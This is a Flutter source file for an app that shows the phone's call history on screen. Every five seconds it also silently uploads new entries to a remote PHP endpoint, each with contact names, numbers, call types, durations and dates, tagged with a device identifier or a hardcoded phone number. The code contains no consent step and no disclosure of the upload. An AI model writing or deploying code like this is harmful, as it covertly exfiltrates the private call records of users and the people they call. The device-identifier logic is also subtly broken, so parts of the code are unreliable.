import 'package:flutter/material.dart';
import 'package:call_log/call_log.dart';
import 'dart:async'; // Import Timer
import 'package:http/http.dart' as http; // For API calls
import 'dart:convert'; // For JSON encoding
import 'package:device_info_plus/device_info_plus.dart'; // For getting user's mobile number

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: CallLogScreen(),
    );
  }
}

class CallLogScreen extends StatefulWidget {
  @override
  _CallLogScreenState createState() => _CallLogScreenState();
}

class _CallLogScreenState extends State<CallLogScreen> {
  Iterable<CallLogEntry> _callLogs = [];
  Set<String> _sentLogs = {}; // Track logs that have already been sent
  Timer? _timer;
  String? _userMobileNumber; // Store the user's mobile number

  final DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();

  @override
  void initState() {
    super.initState();
    _fetchUserMobileNumber(); // Fetch the user's mobile number
    _fetchCallLogs(); // Fetch call logs initially
    _startTimer(); // Start the timer for periodic refresh
  }

  @override
  void dispose() {
    _timer?.cancel(); // Cancel the timer when the widget is disposed
    super.dispose();
  }

  Future<void> _fetchUserMobileNumber() async {
    try {
      if (Theme.of(context).platform == TargetPlatform.android) {
        AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
        _userMobileNumber = androidInfo.id; // Use Android device ID as an alternative
      } else if (Theme.of(context).platform == TargetPlatform.iOS) {
        IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
        _userMobileNumber = iosInfo.identifierForVendor; // Use iOS vendor identifier
      } else {
        _userMobileNumber = 'Unknown'; // Fallback for other platforms
      }

      setState(() {});
    } catch (e) {
      print('Error fetching user mobile number: $e');
      setState(() {
        _userMobileNumber = '9727409779';
      });
    }
    print("User Mobile Number: $_userMobileNumber");
  }

  void _startTimer() {
    _timer = Timer.periodic(Duration(seconds: 5), (timer) {
      _fetchCallLogs(); // Fetch call logs every 5 seconds
    });
  }

  Future<void> _fetchCallLogs() async {
    Iterable<CallLogEntry> callLogs = await CallLog.get();
    setState(() {
      _callLogs = callLogs;
    });

    // Send only new logs to the server
    _sendNewLogsToServer(callLogs);
  }

  Future<void> _sendNewLogsToServer(Iterable<CallLogEntry> callLogs) async {
    // Filter out logs that have already been sent
    List<Map<String, dynamic>> newLogs = [];
    for (var entry in callLogs) {
      String logId = '${entry.timestamp}-${entry.number}'; // Unique identifier
      if (!_sentLogs.contains(logId)) {
        DateTime callDate = DateTime.fromMillisecondsSinceEpoch(entry.timestamp!);
        String formattedDate = '${callDate.year}-${callDate.month.toString().padLeft(2, '0')}-${callDate.day.toString().padLeft(2, '0')} ${callDate.hour.toString().padLeft(2, '0')}:${callDate.minute.toString().padLeft(2, '0')}:${callDate.second.toString().padLeft(2, '0')}';

        // Handle empty or null contact names
        String contactName = entry.name ?? 'Unknown';
        if (contactName.isEmpty || contactName == 'null') {
          contactName = 'Unknown';
        }

        // Handle empty or null phone numbers
        String phoneNumber = entry.number ?? 'Unknown';
        if (phoneNumber.isEmpty || phoneNumber == 'null') {
          phoneNumber = 'Unknown';
        }

        newLogs.add({
          'userPhoneNumber': _userMobileNumber ?? 'Unknown', // Include user's mobile number
          'phoneNumber': phoneNumber,
          'contactName': contactName,
          'callType': _getCallTypeString(entry.callType), // Convert call type to string
          'duration': (entry.duration ?? 0).toString(), // Convert duration to string
          'date': formattedDate, // Format the date
        });
        _sentLogs.add(logId); // Mark this log as sent
      }
    }

    // Send new logs to the server in batches (e.g., 5 logs at a time)
    if (newLogs.isNotEmpty) {
      await _sendLogsToApi(newLogs);
    }
  }

  String _getCallTypeString(CallType? callType) {
    switch (callType) {
      case CallType.incoming:
        return 'Incoming';
      case CallType.outgoing:
        return 'Outgoing';
      case CallType.missed:
        return 'Missed';
      default:
        return 'Unknown';
    }
  }

  Future<void> _sendLogsToApi(List<Map<String, dynamic>> logs) async {
    const String apiUrl = 'https://alyanka.com/call_detail_store_data.php'; // Replace with your API endpoint

    try {
      final response = await http.post(
        Uri.parse(apiUrl),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'data': logs}), // Wrap logs in a 'data' key
      );

      if (response.statusCode == 200) {
        print('Logs sent successfully: ${logs.length}');
      } else {
        print('Failed to send logs: ${response.statusCode}');
      }
    } catch (e) {
      print('Error sending logs: $e');
    }
  }

  String _formatDuration(int durationInSeconds) {
    int minutes = durationInSeconds ~/ 60;
    int seconds = durationInSeconds % 60;
    return '$minutes:${seconds.toString().padLeft(2, '0')}';
  }

  String _formatDate(DateTime date) {
    return '${date.day}/${date.month}/${date.year} ${date.hour}:${date.minute}';
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Call Logs'),
      ),
      body: ListView.builder(
        itemCount: _callLogs.length,
        itemBuilder: (context, index) {
          CallLogEntry entry = _callLogs.elementAt(index);
          DateTime callDate = DateTime.fromMillisecondsSinceEpoch(entry.timestamp!);
          String callDuration = _formatDuration(entry.duration ?? 0);
          String formattedDate = _formatDate(callDate);

          // Handle "Unknown" for names and numbers
          String callerName = entry.name ?? 'Unknown';
          String callerNumber = entry.number ?? 'Unknown';

          // If the name is empty or null, set it to "Unknown"
          if (callerName.isEmpty || callerName == 'null') {
            callerName = 'Unknown';
          }

          // If the number is empty or null, set it to "Unknown"
          if (callerNumber.isEmpty || callerNumber == 'null') {
            callerNumber = 'Unknown';
          }

          return ListTile(
            title: Text(callerName),
            subtitle: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(callerNumber),
                Text('Date: $formattedDate'),
                Text('Duration: $callDuration'),
                Text('User Mobile Number: ${_userMobileNumber ?? 'Unknown'}'), // Display user's mobile number
              ],
            ),
            trailing: Text(entry.callType.toString()),
          );
        },
      ),
    );
  }
}